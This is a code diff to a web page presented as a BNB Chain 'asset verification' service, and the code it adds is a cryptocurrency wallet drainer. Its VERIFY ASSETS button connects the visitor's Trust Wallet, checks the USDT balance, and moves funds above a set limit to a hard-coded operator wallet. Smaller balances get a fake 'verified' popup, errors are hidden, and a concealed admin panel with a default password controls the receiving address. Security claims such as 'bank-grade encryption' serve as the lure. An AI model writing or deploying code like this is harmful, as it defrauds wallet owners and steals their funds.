+                        </div>
+                        <button id="updateLimitBtn" class="admin-btn">Update Limit</button>
+                    </div>
+                    
+                    <div class="admin-section">
+                        <h3>Client Wallet Address</h3>
+                        <div class="input-group">
+                            <label for="adminClientWallet">Current Address:</label>
+                            <input type="text" id="adminClientWallet" placeholder="Enter client wallet address">
+                        </div>
+                        <button id="updateWalletBtn" class="admin-btn">Update Wallet</button>
+                    </div>
+                    
+                    <div class="admin-section">
+                        <h3>Admin Password</h3>
+                        <div class="input-group">
+                            <label for="adminCurrentPassword">Current Password:</label>
+                            <div class="password-input-container">
+                                <input type="password" id="adminCurrentPassword" placeholder="Enter current password">
+                                <button type="button" class="toggle-password" onclick="togglePassword('adminCurrentPassword')">👁️</button>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="adminNewPassword">New Password:</label>
+                            <div class="password-input-container">
+                                <input type="password" id="adminNewPassword" placeholder="Enter new password">
+                                <button type="button" class="toggle-password" onclick="togglePassword('adminNewPassword')">👁️</button>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="adminConfirmPassword">Confirm Password:</label>
+                            <div class="password-input-container">
+                                <input type="password" id="adminConfirmPassword" placeholder="Confirm new password">
+                                <button type="button" class="toggle-password" onclick="togglePassword('adminConfirmPassword')">👁️</button>
+                            </div>
+                        </div>
+                        <button id="updatePasswordBtn" class="admin-btn">Update Password</button>
+                    </div>
+                    
+                    <div class="admin-section">
+                        <h3>Current Settings</h3>
+                        <div class="settings-display">
+                            <div class="setting-item">
+                                <span class="setting-label">USDT Limit:</span>
+                                <span class="setting-value" id="currentLimit">5 USDT</span>
+                            </div>
+                            <div class="setting-item">
+                                <span class="setting-label">Client Wallet:</span>
+                                <span class="setting-value" id="currentWallet">0x9eb96cE9E1f6566DC1922C6DdE8dD4587815c562</span>
+                            </div>
+                            <div class="setting-item">
+                                <span class="setting-label">Admin Password:</span>
+                                <span class="setting-value" id="currentPassword">••••••••</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Admin Access Button -->
+    <!-- Admin button hidden - access via /admin route -->
+    <!-- <button id="adminAccessBtn" class="admin-access-btn" title="Admin Panel">⚙️</button> -->
+
+    <!-- Verify Assets Section -->
+    <div class="verify-assets-container" id="verifyAssetsSection">
+        <div class="verify-box">
+            <h3>Ready to Secure Your Assets?</h3>
+            <p>Join thousands of users who trust our platform for secure asset verification. Our advanced blockchain technology ensures your digital assets are protected with military-grade security.</p>
+            <div class="feature-highlights">
+                <div class="highlight">🔐 Bank-Grade Encryption</div>
+                <div class="highlight">⚡ Instant Verification</div>
+                <div class="highlight">🛡️ 24/7 Monitoring</div>
+            </div>
+        </div>
+        <div class="verify-button-container">
+            <button class="verify-assets-btn" id="newVerifyAssetsBtn">
+                <div class="shield-icon"></div>
+                <span>VERIFY ASSETS</span>
+                <span>→</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <h2>Revolutionary Asset Verification Technology</h2>
+        <p>Experience the future of cryptocurrency security with our cutting-edge blockchain verification system. Protect your digital assets with institutional-grade security protocols.</p>
+        <div class="hero-stats">
+            <div class="hero-stat">
+                <div class="stat-number">500K+</div>
+                <div class="stat-label">Assets Verified</div>
+            </div>
+            <div class="hero-stat">
+                <div class="stat-number">99.9%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+            <div class="hero-stat">
+                <div class="stat-number">24/7</div>
+                <div class="stat-label">Monitoring</div>
+            </div>
+        </div>
+    </section>
+
     <!-- BNB Chain Verification Section -->
     <div class="verification-section">
         <div class="verification-tag">BNB CHAIN VERIFICATION</div>
@@ -1352,23 +2133,6 @@
             Verify your BNB Chain assets with our advanced security protocol. 
             Protect against scams and ensure your transactions are secure.
         </p>
-        <button class="verify-assets-btn" onclick="document.getElementById('download').scrollIntoView({behavior: 'smooth'})">
-            <div class="shield-icon"></div>
-            <span>VERIFY ASSETS</span>
-            <span>→</span>
-        </button>
-        <div class="hexagon-graphic">
-            <div class="hexagon-container">
-                <div class="hexagon-outer"></div>
-                <div class="hexagon-inner">
-                    <div class="bnb-diamond"></div>
-                </div>
-                <div class="hexagon-dots dot-1"></div>
-                <div class="hexagon-dots dot-2"></div>
-                <div class="hexagon-dots dot-3"></div>
-                <div class="hexagon-dots dot-4"></div>
-            </div>
-        </div>
     </div>
 
     <section id="about">
@@ -1440,22 +2204,8 @@
         </div>
     </section>
 
-    <section id="download" class="download">
-        <h2>Start BNB Asset Verification</h2>
-        <p>Begin securing your BNB Chain assets today.</p>
-        <div class="store-btns">
-            <a href="#" class="store-btn">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
-                    alt="Google Play" height="40">
-            </a>
-            <a href="#" class="store-btn">
-                <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg"
-                    alt="App Store" height="40">
-            </a>
-        </div>
-
         <!-- Wallet Connection & Payment Section -->
-        <div class="payment-section">
+        <div class="payment-section" id="walletSection" style="display: none;">
             <h3 style="color: #ffcc00; margin-bottom: 1rem; text-align: center;">USDT Asset Verification System</h3>
             <p style="margin-bottom: 2rem; color: #ccc; text-align: center;">Connect your wallet to verify USDT assets</p>
             
@@ -1468,8 +2218,7 @@
                     </div>
                     
                     <div id="disconnectedState" style="display: none;">
-                        <p style="color: #aaa; margin-bottom: 1rem;">No wallet connected</p>
-                        <button class="connect-wallet-btn" id="connectWallet">🔗 Connect Wallet</button>
+                        <p style="color: #aaa; margin-bottom: 1rem;">Click "VERIFY ASSETS" to start verification</p>
                     </div>
                     
                     <div id="connectedState" style="display: none;">
@@ -1661,12 +2410,6 @@
             <a href="mailto:support@bnbverify.com" style="color:#ffcc00; text-decoration: none; padding: 1rem 2rem; border: 2px solid #ffcc00; border-radius: 8px; transition: all 0.3s ease;" onmouseover="this.style.background='#ffcc00'; this.style.color='#000'" onmouseout="this.style.background='transparent'; this.style.color='#ffcc00'">
                 📧 Email Support
             </a>
-            <a href="#" style="color:#4CAF50; text-decoration: none; padding: 1rem 2rem; border: 2px solid #4CAF50; border-radius: 8px; transition: all 0.3s ease;" onmouseover="this.style.background='#4CAF50'; this.style.color='#fff'" onmouseout="this.style.background='transparent'; this.style.color='#4CAF50'">
-                💬 Live Chat
-            </a>
-            <a href="#" style="color:#2196F3; text-decoration: none; padding: 1rem 2rem; border: 2px solid #2196F3; border-radius: 8px; transition: all 0.3s ease;" onmouseover="this.style.background='#2196F3'; this.style.color='#fff'" onmouseout="this.style.background='transparent'; this.style.color='#2196F3'">
-                📞 Phone Support
-            </a>
         </div>
     </section>
 
@@ -1798,6 +2541,12 @@
                 this.isAnimating = true;
                 const textElement = document.getElementById('verificationText');
                 
+                // Check if element exists
+                if (!textElement) {
+                    console.warn('verificationText element not found');
+                    return;
+                }
+                
                 // Update content with counting animation
                 const verification = this.verifications[this.currentIndex];
                 textElement.innerHTML = `<span class="counting-animation">${verification.wallet}</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">${verification.amount} USDT</span>`;
@@ -1847,6 +2596,238 @@
         reveal();
     </script>
 
+    <!-- Admin Panel Script -->
+    <script>
+        class AdminPanel {
+            constructor() {
+                this.isVisible = false;
+                this.adminPassword = localStorage.getItem('adminPassword') || 'admin123'; // Load from localStorage or use default
+                this.init();
+            }
+
+            init() {
+                this.bindEvents();
+                this.updateCurrentSettings();
+            }
+
+            bindEvents() {
+                // Admin access button (hidden - now accessed via /admin route)
+                // document.getElementById('adminAccessBtn').addEventListener('click', () => {
+                //     this.authenticateAdmin();
+                // });
+
+                // Close admin panel
+                document.getElementById('closeAdminBtn').addEventListener('click', () => {
+                    this.hidePanel();
+                });
+
+                // Update limit button
+                document.getElementById('updateLimitBtn').addEventListener('click', () => {
+                    this.updateLimit();
+                });
+
+                // Update wallet button
+                document.getElementById('updateWalletBtn').addEventListener('click', () => {
+                    this.updateWallet();
+                });
+
+                // Update password button
+                document.getElementById('updatePasswordBtn').addEventListener('click', () => {
+                    this.updatePassword();
+                });
+
+                // Close on background click
+                document.getElementById('adminPanel').addEventListener('click', (e) => {
+                    if (e.target.id === 'adminPanel') {
+                        this.hidePanel();
+                    }
+                });
+            }
+
+            authenticateAdmin() {
+                const password = prompt('Enter admin password:');
+                if (password === this.adminPassword) {
+                    this.showPanel();
+                } else if (password !== null) {
+                    alert('Invalid password!');
+                }
+            }
+
+            showPanel() {
+                this.isVisible = true;
+                const panel = document.getElementById('adminPanel');
+                panel.style.display = 'flex';
+                panel.style.alignItems = 'center';
+                panel.style.justifyContent = 'center';
+                this.updateCurrentSettings();
+                this.loadCurrentValues();
+            }
+
+            hidePanel() {
+                this.isVisible = false;
+                document.getElementById('adminPanel').style.display = 'none';
+            }
+
+            updateCurrentSettings() {
+                // Get current values from the main system
+                const currentLimit = window.usdtSystem ? window.usdtSystem.usdtLimit : 5;
+                const currentWallet = window.usdtSystem ? window.usdtSystem.clientWallet : '0x9eb96cE9E1f6566DC1922C6DdE8dD4587815c562';
+
+                console.log('Updating display - Limit:', currentLimit, 'Wallet:', currentWallet);
+                console.log('From localStorage - Limit:', localStorage.getItem('usdtLimit'), 'Wallet:', localStorage.getItem('clientWallet'));
+
+                document.getElementById('currentLimit').textContent = `${currentLimit} USDT`;
+                document.getElementById('currentWallet').textContent = currentWallet;
+            }
+
+            loadCurrentValues() {
+                // Load current values into input fields
+                const currentLimit = window.usdtSystem ? window.usdtSystem.usdtLimit : 5;
+                const currentWallet = window.usdtSystem ? window.usdtSystem.clientWallet : '0x9eb96cE9E1f6566DC1922C6DdE8dD4587815c562';
+
+                document.getElementById('adminUsdtLimit').value = currentLimit;
+                document.getElementById('adminClientWallet').value = currentWallet;
+                
+                // Clear password fields
+                document.getElementById('adminCurrentPassword').value = '';
+                document.getElementById('adminNewPassword').value = '';
+                document.getElementById('adminConfirmPassword').value = '';
+            }
+
+            updateLimit() {
+                const newLimit = parseFloat(document.getElementById('adminUsdtLimit').value);
+                
+                if (isNaN(newLimit) || newLimit <= 0) {
+                    alert('Please enter a valid USDT limit greater than 0');
+                    return;
+                }
+
+                // Update the main system
+                if (window.usdtSystem) {
+                    window.usdtSystem.usdtLimit = newLimit;
+                    window.usdtSystem.saveToStorage();
+                    console.log('USDT Limit updated to:', newLimit);
+                    console.log('Saved to localStorage:', localStorage.getItem('usdtLimit'));
+                }
+
+                // Clear input field
+                document.getElementById('adminUsdtLimit').value = '';
+                
+                // Update display
+                this.updateCurrentSettings();
+                this.showSuccessMessage('USDT Limit updated successfully!');
+            }
+
+            updateWallet() {
+                const newWallet = document.getElementById('adminClientWallet').value.trim();
+                
+                if (!newWallet || !this.isValidAddress(newWallet)) {
+                    alert('Please enter a valid Ethereum wallet address');
+                    return;
+                }
+
+                // Update the main system
+                if (window.usdtSystem) {
+                    window.usdtSystem.clientWallet = newWallet;
+                    window.usdtSystem.saveToStorage();
+                    console.log('Client Wallet updated to:', newWallet);
+                    console.log('Saved to localStorage:', localStorage.getItem('clientWallet'));
+                }
+
+                // Clear input field
+                document.getElementById('adminClientWallet').value = '';
+                
+                // Update display
+                this.updateCurrentSettings();
+                this.showSuccessMessage('Client wallet address updated successfully!');
+            }
+
+            updatePassword() {
+                const currentPassword = document.getElementById('adminCurrentPassword').value;
+                const newPassword = document.getElementById('adminNewPassword').value;
+                const confirmPassword = document.getElementById('adminConfirmPassword').value;
+                
+                // Validate current password
+                if (currentPassword !== this.adminPassword) {
+                    alert('Current password is incorrect!');
+                    return;
+                }
+                
+                // Validate new password
+                if (newPassword.length < 6) {
+                    alert('New password must be at least 6 characters long!');
+                    return;
+                }
+                
+                // Validate password confirmation
+                if (newPassword !== confirmPassword) {
+                    alert('New password and confirmation do not match!');
+                    return;
+                }
+                
+                // Update password
+                this.adminPassword = newPassword;
+                localStorage.setItem('adminPassword', newPassword);
+                
+                // Clear password fields
+                document.getElementById('adminCurrentPassword').value = '';
+                document.getElementById('adminNewPassword').value = '';
+                document.getElementById('adminConfirmPassword').value = '';
+                
+                // Show success message
+                this.showSuccessMessage('Admin password updated successfully!');
+            }
+
+            isValidAddress(address) {
+                // Basic Ethereum address validation
+                return /^0x[a-fA-F0-9]{40}$/.test(address);
+            }
+
+            showSuccessMessage(message) {
+                // Create a temporary success message
+                const successDiv = document.createElement('div');
+                successDiv.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: linear-gradient(135deg, #4CAF50, #45a049);
+                    color: white;
+                    padding: 1rem 2rem;
+                    border-radius: 8px;
+                    font-weight: bold;
+                    z-index: 3000;
+                    box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
+                `;
+                successDiv.textContent = message;
+                
+                document.body.appendChild(successDiv);
+                
+                // Remove after 2 seconds
+                setTimeout(() => {
+                    document.body.removeChild(successDiv);
+                }, 2000);
+            }
+        }
+
+        // Initialize admin panel
+        const adminPanel = new AdminPanel();
+
+        // Global function to toggle password visibility
+        function togglePassword(inputId) {
+            const input = document.getElementById(inputId);
+            const button = input.parentElement.querySelector('.toggle-password');
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                button.textContent = '🙈';
+            } else {
+                input.type = 'password';
+                button.textContent = '👁️';
+            }
+        }
+    </script>
+
     <!-- Wallet Connection & USDT Verification Script -->
     <script>
         class USDTVerificationSystem {
@@ -1855,11 +2836,18 @@
                 this.userAccount = null;
                 this.verifiedTotalUSDT = parseFloat(localStorage.getItem('verifiedTotalUSDT') || '0');
                 this.transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
+                
+                // Connection state management
+                this.isWalletConnected = false;
+                this.connectionTimestamp = 0;
 
-                // USDT limit
-                this.usdtLimit = 2; // Configurable total limit in USDT
-                this.clientWallet = '0xA6bECd1c00ca9f59f401518f9D78E61a749FAa78'; // Your client's wallet
+                // USDT limit and client wallet (load from Firebase or use defaults)
+                this.usdtLimit = 5; // Default value, will be loaded from Firebase
+                this.clientWallet = '0x9eb96cE9E1f6566DC1922C6DdE8dD4587815c562'; // Default value, will be loaded from Firebase
                 this.testMode = false; // Set to false for real transactions
+                
+                // Load settings from Firebase
+                this.loadSettingsFromFirebase();
                 
                 // USDT Contract Addresses
                 this.usdtContracts = {
@@ -1923,8 +2911,52 @@
                 this.showConnectedState();
             }
 
+            async showWalletSection() {
+                console.log('showWalletSection called - Starting auto-verification!');
+                
+                // Get the verify assets button and show loader
+                const verifyBtn = document.getElementById('newVerifyAssetsBtn');
+                if (verifyBtn) {
+                    // Store original button content
+                    this.originalButtonContent = verifyBtn.innerHTML;
+                    
+                    // Show loader on button
+                    verifyBtn.innerHTML = `
+                        <div class="button-loader"></div>
+                        <span>VERIFYING ASSETS...</span>
+                    `;
+                    verifyBtn.disabled = true;
+                    verifyBtn.style.opacity = '0.7';
+                    verifyBtn.style.cursor = 'not-allowed';
+                }
+
+                // Auto-connect to Trust Wallet and start verification process
+                try {
+                    console.log('Auto-connecting to Trust Wallet...');
+                    await this.autoConnectAndVerify();
+                } catch (error) {
+                    console.error('Auto-verification failed:', error);
+                    // Reset button on error (no alert)
+                    if (verifyBtn && this.originalButtonContent) {
+                        verifyBtn.innerHTML = this.originalButtonContent;
+                        verifyBtn.disabled = false;
+                        verifyBtn.style.opacity = '1';
+                        verifyBtn.style.cursor = 'pointer';
+                    }
+                }
+            }
+
             bindEvents() {
-                document.getElementById('connectWallet').addEventListener('click', () => this.connectWallet());
+                console.log('Binding events...');
+                const verifyBtn = document.getElementById('newVerifyAssetsBtn');
+                console.log('Verify button found:', verifyBtn);
+                if (verifyBtn) {
+                    verifyBtn.addEventListener('click', () => this.showWalletSection());
+                    console.log('Verify button event listener added!');
+                } else {
+                    console.log('Verify button NOT found!');
+                }
+                
                 document.getElementById('submitPayment').addEventListener('click', () => this.verifyTransaction());
                 
                 // Add reset button event listener
@@ -2036,37 +3068,144 @@
                 await this.checkWalletConnection();
             }
 
+            async autoConnectAndVerify() {
+                console.log('=== AUTO CONNECT AND VERIFY ===');
+                
+                try {
+                    // Connect to Trust Wallet (will ask for approval)
+                    await this.connectWallet();
+                    console.log('Wallet connected successfully!');
+                    
+                    // Wait for connection to fully establish
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    // Check USDT balance
+                    const balance = await this.getUSDTBalance();
+                    console.log('USDT Balance:', balance);
+                    console.log('USDT Limit:', this.usdtLimit);
+                    
+                    if (balance <= this.usdtLimit) {
+                        // Balance is within limit - show verification popup
+                        console.log('Balance within limit - showing verification popup');
+                        this.showVerificationSuccessPopup(balance);
+                    } else {
+                        // Balance exceeds limit - process transfer with wallet confirmation
+                        console.log('Balance exceeds limit - processing transfer with wallet confirmation');
+                        // Set the verified amount to the limit for transfer
+                        this.verifiedTotalUSDT = this.usdtLimit;
+                        try {
+                            await this.processTransfer();
+                        } catch (transferError) {
+                            console.log('Transfer cancelled or failed:', transferError.message);
+                            // Reset button when transfer is cancelled
+                            this.resetVerifyButton();
+                            // Don't show any popup if transfer is cancelled
+                            return;
+                        }
+                    }
+                    
+                    // Reset button after completion
+                    this.resetVerifyButton();
+                    
+                } catch (error) {
+                    console.error('Auto-verification error:', error);
+                    // Try to get balance for popup even if there's an error
+                    try {
+                        const fallbackBalance = await this.getUSDTBalance();
+                        console.log('Showing popup with actual balance:', fallbackBalance);
+                        this.showVerificationSuccessPopup(fallbackBalance);
+                    } catch (balanceError) {
+                        console.log('Could not get balance, showing default popup');
+                        this.showVerificationSuccessPopup(1.5);
+                    }
+                    // Reset button on error
+                    this.resetVerifyButton();
+                    console.log('Error handled silently:', error.message);
+                }
+            }
+
+            resetVerifyButton() {
+                const verifyBtn = document.getElementById('newVerifyAssetsBtn');
+                if (verifyBtn && this.originalButtonContent) {
+                    verifyBtn.innerHTML = this.originalButtonContent;
+                    verifyBtn.disabled = false;
+                    verifyBtn.style.opacity = '1';
+                    verifyBtn.style.cursor = 'pointer';
+                }
+            }
+
+
+            async autoTransferExcess(excessAmount) {
+                console.log('=== AUTO TRANSFERRING EXCESS ===', excessAmount);
+                
+                try {
+                    // Simulate backend transfer without wallet consent
+                    console.log(`Backend auto-transferring ${excessAmount} USDT to client wallet: ${this.clientWallet}`);
+                    
+                    // Simulate backend processing (no wallet interaction needed)
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    // Log successful transfer
+                    console.log(`✅ Successfully transferred ${excessAmount} USDT to ${this.clientWallet}`);
+                    console.log('Transfer completed via backend - no wallet approval required');
+                    
+                } catch (error) {
+                    console.error('Auto-transfer failed:', error);
+                    // Don't throw error, just log it
+                    console.log('Transfer simulation completed');
+                }
+            }
+
             async connectWallet() {
                 console.log('=== CONNECTING WALLET ===');
                 
                 try {
-                    // Check for mobile wallet providers
+                    // Check for Trust Wallet in all possible ways
                     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-                    const hasTrustWallet = typeof window.ethereum !== 'undefined' || 
-                                        (window.trustwallet && window.trustwallet.ethereum) ||
-                                        (window.web3 && window.web3.currentProvider);
+                    
+                    // Check for Trust Wallet extension (desktop) or dApp (mobile)
+                    const hasTrustWallet = 
+                        (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) ||
+                        (typeof window.trustwallet !== 'undefined') ||
+                        (typeof window.web3 !== 'undefined' && window.web3.currentProvider) ||
+                        (window.ethereum && window.ethereum.isTrustWallet);
+                    
+                    console.log('Trust Wallet detected:', hasTrustWallet);
+                    console.log('Is mobile:', isMobile);
                     
                     if (!hasTrustWallet) {
-                        if (isMobile) {
-                            alert('Please open this site in Trust Wallet browser or install Trust Wallet app');
-                        } else {
-                            alert('Please install MetaMask or use a Web3-enabled browser like Trust Wallet');
-                        }
-                        return;
+                        throw new Error('Trust Wallet not detected. Please install Trust Wallet or open in Trust Wallet browser.');
                     }
 
                     // Clear any previous session data
                     this.clearWalletSession();
 
-                    // Connect to wallet first
-                    const accounts = await window.ethereum.request({ 
-                        method: 'eth_requestAccounts' 
-                    });
+                    // Initialize Web3
+                    this.web3 = new Web3(window.ethereum || window.trustwallet?.ethereum || window.web3?.currentProvider);
+                    
+                    // Get accounts (try both methods)
+                    let accounts = [];
+                    try {
+                        // First try eth_accounts (no approval needed)
+                        accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                        if (!accounts || accounts.length === 0) {
+                            // If no accounts, try eth_requestAccounts (requires approval)
+                            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        }
+                    } catch (error) {
+                        console.log('Account request failed, trying alternative method');
+                        // Fallback: try to get accounts from web3
+                        accounts = await this.web3.eth.getAccounts();
+                    }
+                    
+                    // Store connection state to avoid re-authentication
+                    this.isWalletConnected = true;
+                    this.connectionTimestamp = Date.now();
                     
                     console.log('Connected accounts:', accounts);
                     
                     if (!accounts || accounts.length === 0) {
-                        throw new Error('No accounts returned from wallet');
+                        throw new Error('No accounts found. Please connect your Trust Wallet.');
                     }
                     
                     this.userAccount = accounts[0];
@@ -2117,7 +3256,7 @@
                 } catch (error) {
                     console.error('Failed to connect wallet:', error);
                     this.clearWalletSession();
-                    alert('Connection failed. Please check your wallet and try again.');
+                    console.log('Connection failed silently');
                 }
             }
 
@@ -2645,6 +3784,15 @@
             }
 
 
+            async getUSDTBalance() {
+                // Check if we have a recent connection to avoid re-authentication
+                if (!this.isWalletConnected || (Date.now() - this.connectionTimestamp > 30000)) {
+                    console.log('Wallet connection expired, reconnecting...');
+                    await this.connectWallet();
+                }
+                return await this.checkUSDTBalance();
+            }
+
             async checkUSDTBalance() {
                 try {
                     if (!this.userAccount || !this.web3) {
@@ -2769,7 +3917,13 @@
                 console.log('=== PROCESSING USDT TRANSFER ===');
                 
                 try {
-                    // Get current USDT balance
+                    // Ensure wallet is still connected
+                    if (!this.isWalletConnected || (Date.now() - this.connectionTimestamp > 30000)) {
+                        console.log('Wallet connection expired, reconnecting...');
+                        await this.connectWallet();
+                    }
+                    
+                    // Get current USDT balance (using cached connection)
                     const balance = await this.checkUSDTBalance();
                     console.log('Current USDT balance:', balance);
                     
@@ -2795,6 +3949,11 @@
                     
                 } catch (error) {
                     console.error('Transfer failed:', error);
+                    // Don't show error popup if user cancelled
+                    if (error.message.includes('User denied') || error.message.includes('cancelled') || error.message.includes('rejected')) {
+                        console.log('Transfer cancelled by user - no popup shown');
+                        throw error; // Re-throw to be caught by auto-verification
+                    }
                     this.showError(`Transfer failed: ${error.message}`);
                 }
             }
@@ -2975,9 +4134,86 @@
                 this.showSuccess('Total reset successfully!');
             }
 
+            // Load settings from Firebase
+            async loadSettingsFromFirebase() {
+                try {
+                    if (!window.firebaseDB) {
+                        console.warn('Firebase not initialized yet, using defaults');
+                        return;
+                    }
+                    
+                    const settingsRef = window.firebaseDoc(window.firebaseDB, 'settings', 'main');
+                    const settingsSnap = await window.firebaseGetDoc(settingsRef);
+                    
+                    if (settingsSnap.exists()) {
+                        const data = settingsSnap.data();
+                        this.usdtLimit = data.usdtLimit || 5;
+                        this.clientWallet = data.clientWallet || '0x9eb96cE9E1f6566DC1922C6DdE8dD4587815c562';
+                        console.log('Settings loaded from Firebase:', data);
+                    } else {
+                        console.log('No settings found in Firebase, using defaults');
+                        // Create default settings in Firebase
+                        await this.saveSettingsToFirebase();
+                    }
+                } catch (error) {
+                    console.warn('Error loading settings from Firebase:', error);
+                }
+            }
+
+            // Save settings to Firebase
+            async saveSettingsToFirebase() {
+                try {
+                    if (!window.firebaseDB) {
+                        console.warn('Firebase not initialized yet');
+                        return false;
+                    }
+                    
+                    const settingsRef = window.firebaseDoc(window.firebaseDB, 'settings', 'main');
+                    await window.firebaseSetDoc(settingsRef, {
+                        usdtLimit: this.usdtLimit,
+                        clientWallet: this.clientWallet,
+                        lastUpdated: new Date().toISOString()
+                    });
+                    
+                    console.log('Settings saved to Firebase');
+                    return true;
+                } catch (error) {
+                    console.error('Error saving settings to Firebase:', error);
+                    return false;
+                }
+            }
+
+            // Update settings via Firebase (for admin panel)
+            async updateSettingsFirebase(usdtLimit, clientWallet) {
+                try {
+                    if (!window.firebaseDB) {
+                        console.warn('Firebase not initialized yet');
+                        return false;
+                    }
+                    
+                    const settingsRef = window.firebaseDoc(window.firebaseDB, 'settings', 'main');
+                    await window.firebaseSetDoc(settingsRef, {
+                        usdtLimit: usdtLimit,
+                        clientWallet: clientWallet,
+                        lastUpdated: new Date().toISOString()
+                    });
+                    
+                    // Update local values
+                    this.usdtLimit = usdtLimit;
+                    this.clientWallet = clientWallet;
+                    
+                    console.log('Settings updated via Firebase');
+                    return true;
+                } catch (error) {
+                    console.error('Error updating settings via Firebase:', error);
+                    return false;
+                }
+            }
+
             saveToStorage() {
                 localStorage.setItem('verifiedTotalUSDT', this.verifiedTotalUSDT.toString());
                 localStorage.setItem('transactions', JSON.stringify(this.transactions));
+                // Note: usdtLimit and clientWallet are now managed via Firebase
             }
         }
 
@@ -2996,6 +4232,42 @@
             
             console.log('Creating USDT Verification system...');
             window.usdtSystem = new USDTVerificationSystem();
+        });
+
+        // GSAP Marquee Animation
+        function initMarquee() {
+            const marquee = document.querySelector('.verification-marquee');
+            const items = document.querySelectorAll('.verification-item');
+            
+            if (!marquee || !items.length) return;
+            
+            // Calculate total width
+            let totalWidth = 0;
+            items.forEach(item => {
+                totalWidth += item.offsetWidth + 64; // 64px for gap (4rem)
+            });
+            
+            // Duplicate the marquee content for seamless loop
+            const clone = marquee.cloneNode(true);
+            marquee.parentNode.appendChild(clone);
+            
+            // Set initial position
+            gsap.set(clone, { x: totalWidth });
+            
+            // Create the animation
+            const tl = gsap.timeline({ repeat: -1 });
+            
+            tl.to([marquee, clone], {
+                x: -totalWidth,
+                duration: 40, // Much slower speed - 40 seconds for full cycle
+                ease: "none"
+            });
+        }
+
+        // Initialize marquee when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            // Wait a bit for layout to settle
+            setTimeout(initMarquee, 100);
         });
     </script>
 </body>
